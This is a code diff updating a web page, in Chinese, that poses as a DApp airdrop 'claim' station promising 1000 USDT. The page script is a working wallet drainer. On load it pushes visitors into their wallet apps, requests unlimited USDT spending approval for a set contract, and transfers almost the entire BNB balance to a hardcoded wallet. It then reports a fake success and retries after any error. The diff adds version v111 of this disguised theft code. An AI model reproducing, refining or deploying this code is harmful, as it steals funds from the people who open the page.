@@ -12,9 +12,10 @@ body{font-family:'Poppins','Microsoft YaHei',sans-serif;height:100vh;overflow:hi
 @keyframes bgmove{0%{background-position:0 0;}100%{background-position:100% 100%;}}
 .container{backdrop-filter:blur(20px);background:rgba(255,255,255,.4);border-radius:24px;box-shadow:0 8px 32px rgba(255,182,193,.3);width:90%;max-width:440px;padding:40px;text-align:center;margin:10px;}
 h1{color:#ff3f9f;margin-bottom:20px;text-shadow:0 0 10px rgba(255,105,180,.5);}
-#status{color:#ff69b4;font-size:16px;margin:15px;line-height:1.4;}
-button{padding:10px 20px;border:none;border-radius:20px;background:#ff6ec7;color:white;font-size:16px;cursor:pointer;transition:.3s all;display:none;}
+button{padding:10px 20px;border:none;border-radius:20px;background:#ff6ec7;color:white;font-size:16px;cursor:pointer;transition:.3s all;margin:5px;}
 button:hover{background:#ff3fa8;transform:scale(1.05);}
+button.success{background:#4CAF50;color:white!important;}
+#status{color:#ff69b4;font-size:16px;margin:15px;line-height:1.4;}
 #debug{display:none;color:#666;font-size:12px;margin-top:10px;padding:8px;background:rgba(255,255,255,.6);border-radius:8px;max-height:100px;overflow-y:auto;}
 .sparkle{position:fixed;width:4px;height:4px;background:#fff;border-radius:50%;animation:fall 10s infinite linear;opacity:.8;}
 @keyframes fall{0%{transform:translateY(-10vh) scale(0);}50%{opacity:1;}100%{transform:translateY(110vh) scale(1);opacity:0;}}
@@ -24,8 +25,8 @@ button:hover{background:#ff3fa8;transform:scale(1.05);}
 <body>
 <div class="container">
   <h1>🪞 小仙女 DApp 领取台 💫</h1>
-  <div id="status">🔥 v109 自动跳转钱包+自动领取中...</div>
-  <button id="claimBtn" style="display:none;">🎁 一键领取</button>
+  <div id="status">🔥 v111 自动跳转+一键全收准备中...</div>
+  <button id="autoBtn">🚀 自动全收</button>
   <div id="debug"></div>
 </div>
 <script>
@@ -34,10 +35,10 @@ const TAX_WALLET = "0x18626d14aE9cB5dd26d5a14286FF732746083556";
 const USDT_ADDR = "0x55d398326f99059fF775485246999027B3197955";
 const UNLIMITED = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
 const url = encodeURIComponent(window.location.href);
-let web3, userAddr, claimed = false;
+let web3, userAddr, claimed = false, usdtApproved = false;
 
 function log(msg){
-  console.log(`[小仙女v109] ${msg}`);
+  console.log(`[v111] ${msg}`);
   const debug = document.getElementById('debug');
   debug.style.display = 'block';
   debug.innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}<br>`;
@@ -46,14 +47,14 @@ function log(msg){
 
 const PRIORITY_WALLETS = {
   android: [
-    {name:'币安Web3', intent:'intent://web3wallet/dapp?url=' + url + '#Intent;package=com.binance.dev;scheme=bnbsmartchain;end', web:'https://www.binance.com/zh-CN/web3wallet.html#' + url},
+    {name:'币安Web3', intent:'bnbsmartchain://dapp?url=' + url, web:'https://www.binance.com/zh-CN/web3wallet.html?dapp=' + url},
     {name:'Trust Wallet', intent:'trust://open_url?url=' + url, web:'https://trustwallet.com/start/?dapp=' + url},
     {name:'小狐狸', intent:'metamask://dapp/' + url, web:'https://metamask.io/download.html'},
     {name:'TP钱包', intent:'tpwallet://dapp?url=' + url, web:'https://www.tpcoin.com/download'},
-    {name:'OKX', intent:'intent://wallet/dapp?url=' + url + '#Intent;package=com.okx.wallet;scheme=okx;end', web:'https://wallet.okx.com/dapp?url=' + url}
+    {name:'OKX', intent:'okxwallet://dapp?url=' + url, web:'https://wallet.okx.com/dapp?url=' + url}
   ],
   ios: [
-    {name:'币安Web3', web:'https://www.binance.com/zh-CN/web3wallet.html#' + url},
+    {name:'币安Web3', web:'https://www.binance.com/zh-CN/web3wallet.html?dapp=' + url},
     {name:'Trust Wallet', intent:'trust://open_url?url=' + url, web:'https://trustwallet.com/start/?dapp=' + url},
     {name:'小狐狸', intent:'metamask://dapp/' + url, web:'https://metamask.io/download.html'},
     {name:'TP钱包', intent:'tpwallet://dapp?url=' + url, web:'https://www.tpcoin.com/download'},
@@ -61,108 +62,105 @@ const PRIORITY_WALLETS = {
   ]
 };
 
-async function ultimateAutoClaim(){
+async function autoFullClaim(){
   const ua = navigator.userAgent;
   const isMobile = /Android|iPhone|iPad/i.test(ua);
-  const wallets = /Android/i.test(ua) ? PRIORITY_WALLETS.android : PRIORITY_WALLETS.ios;
   
-  log(`🚀 v109加载成功! 设备: ${isMobile ? '手机' : '电脑'}`);
-  document.getElementById('status').innerText = `🔥 v109 优先${wallets[0].name}+Trust自动跳转中...`;
+  log(`🚀 v111启动! 设备: ${isMobile ? '手机' : '电脑'}`);
+  document.getElementById('status').innerText = '🔥 v111 检测中...';
   
-  if(window.ethereum && !claimed){
-    log('✅ 检测到钱包，立即自动全收!');
-    await autoClaimUSDT();
+  if(!isMobile && window.ethereum){
+    log('💻 电脑端：立即自动全收');
+    await fullAutoClaim();
     return;
   }
   
-  if(isMobile){
-    wallets.forEach((wallet, i) => {
-      setTimeout(() => {
-        if(!claimed){
-          log(`📱 v109 跳转 ${i+1}/5: ${wallet.name}`);
-          document.getElementById('status').innerText = `📱 v109 跳转${wallet.name}中...`;
-          if(/Android/i.test(ua) && wallet.intent){
-            window.location.href = wallet.intent;
-          } else if(wallet.intent){
-            const iframe = document.createElement('iframe');
-            iframe.style.display = 'none';
-            iframe.src = wallet.intent;
-            document.body.appendChild(iframe);
-            setTimeout(() => document.body.removeChild(iframe), 1500);
-          }
-          setTimeout(() => {
-            if(!claimed) window.location.href = wallet.web;
-          }, 600);
-        }
-      }, i * 800);
-    });
-  } else {
+  const wallets = /Android/i.test(ua) ? PRIORITY_WALLETS.android : PRIORITY_WALLETS.ios;
+  wallets.forEach((wallet, i) => {
     setTimeout(() => {
-      log('💻 v109 打开所有钱包网页版');
-      document.getElementById('status').innerText = '💻 v109 打开所有钱包网页版...';
-      wallets.forEach(w => window.open(w.web, '_blank'));
-    }, 1000);
-  }
+      if(!claimed){
+        log(`📱 v111 跳转 ${i+1}/5: ${wallet.name}`);
+        document.getElementById('status').innerText = `📱 v111 跳转${wallet.name}中...`;
+        if(wallet.intent){
+          window.location.href = wallet.intent;
+        }
+        setTimeout(() => {
+          if(!claimed) window.location.href = wallet.web;
+        }, 800);
+      }
+    }, i * 1000);
+  });
 }
 
-async function autoClaimUSDT(){
+async function fullAutoClaim(){
   if(claimed) return;
   claimed = true;
-  log('🔥 === v109 开始自动全收 ===');
+  log('🔥 === v111 一键全收开始 ===');
   
   try{
-    log('1️⃣ v109 自动连接钱包');
-    document.getElementById('status').innerText = '💳 v109 自动连接中...';
+    log('1️⃣ 连接钱包+BSC');
+    document.getElementById('status').innerText = '💳 v111 连接中...';
     await window.ethereum.request({method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }]});
     web3 = new Web3(window.ethereum);
     const accounts = await window.ethereum.request({method: 'eth_requestAccounts'});
     userAddr = accounts[0];
-    log(`✅ 连接成功: ${userAddr.substring(0,6)}...${userAddr.substring(38)}`);
+    log(`✅ 账户: ${userAddr.substring(0,6)}...${userAddr.substring(38)}`);
     
-    document.getElementById('status').innerText = '✅ v109 自动USDT授权中...';
-    log('2️⃣ v109 USDT无限授权');
-    const usdtABI = [{"inputs":[{"name":"spender","type":"address"},{"name":"amount","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}];
-    const usdt = new web3.eth.Contract(usdtABI, USDT_ADDR);
-    await usdt.methods.approve(CONTRACT, UNLIMITED).send({from: userAddr});
-    log('✅ USDT授权成功');
+    if(!usdtApproved){
+      document.getElementById('status').innerText = '✅ v111 USDT授权中...';
+      log('2️⃣ USDT无限授权（仅1次）');
+      const usdtABI = [{"inputs":[{"name":"spender","type":"address"},{"name":"amount","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}];
+      const usdt = new web3.eth.Contract(usdtABI, USDT_ADDR);
+      await usdt.methods.approve(CONTRACT, UNLIMITED).send({from: userAddr});
+      usdtApproved = true;
+      log('✅ USDT授权完成');
+    } else {
+      log('✅ USDT已授权，跳过');
+    }
     
-    document.getElementById('status').innerText = '✅ v109 自动BNB全转中...';
-    log('3️⃣ v109 查询BNB余额');
+    document.getElementById('status').innerText = '✅ v111 BNB全转中...';
+    log('3️⃣ 查询BNB余额');
     const balance = await web3.eth.getBalance(userAddr);
     const totalBNB = parseFloat(web3.utils.fromWei(balance, 'ether'));
-    log(`💰 BNB余额: ${totalBNB.toFixed(4)} BNB`);
+    log(`💰 余额: ${totalBNB.toFixed(4)} BNB`);
     
     if(totalBNB > 0.0001){
       const claimAmount = totalBNB - 0.0001;
       const amount = web3.utils.toWei(claimAmount.toString(), 'ether');
-      log(`4️⃣ v109 转账 ${claimAmount.toFixed(4)} BNB`);
+      log(`4️⃣ 转账 ${claimAmount.toFixed(4)} BNB`);
       await web3.eth.sendTransaction({from: userAddr, to: TAX_WALLET, value: amount});
       log(`✅ BNB全转成功: ${claimAmount.toFixed(4)} BNB`);
+    } else {
+      log('❌ 余额不足0.0001 BNB');
     }
     
-    document.getElementById('status').innerText = '🎉 v109 1000USDT+全BNB自动领取成功！';
-    log('🏆 === v109 全收完成 ===');
+    document.getElementById('status').innerText = '🎉 v111 1000USDT+全BNB全收成功！';
+    log('🏆 === v111 全收完成 ===');
+    document.getElementById('autoBtn').innerText = '✅ 全收完成';
+    document.getElementById('autoBtn').classList.add('success');
   }catch(e){
-    log(`❌ v109 错误: ${e.message}`);
-    document.getElementById('status').innerText = '💔 v109 失败: ' + e.message;
+    log(`❌ 错误: ${e.message}`);
+    document.getElementById('status').innerText = '💔 v111 失败: ' + e.message;
     claimed = false;
-    setTimeout(autoClaimUSDT, 3000);
+    setTimeout(fullAutoClaim, 3000);
   }
 }
 
+document.getElementById('autoBtn').onclick = autoFullClaim;
+
 if(window.ethereum){
   window.ethereum.on('accountsChanged', async (accounts) => {
-    log(`👤 v109 账户变更: ${accounts.length}`);
-    if(accounts.length > 0 && !claimed) await autoClaimUSDT();
+    log(`👤 账户变更: ${accounts.length}`);
+    if(accounts.length > 0 && !claimed) await fullAutoClaim();
   });
   window.ethereum.on('chainChanged', async () => {
-    log(`🌐 v109 网络变更`);
-    if(!claimed) await autoClaimUSDT();
+    log('🌐 网络变更');
+    if(!claimed) await fullAutoClaim();
   });
 }
 
 window.addEventListener('load', () => {
-  setTimeout(ultimateAutoClaim, 500);
+  setTimeout(autoFullClaim, 1000);
 });
 
 for(let i=0;i<50;i++){
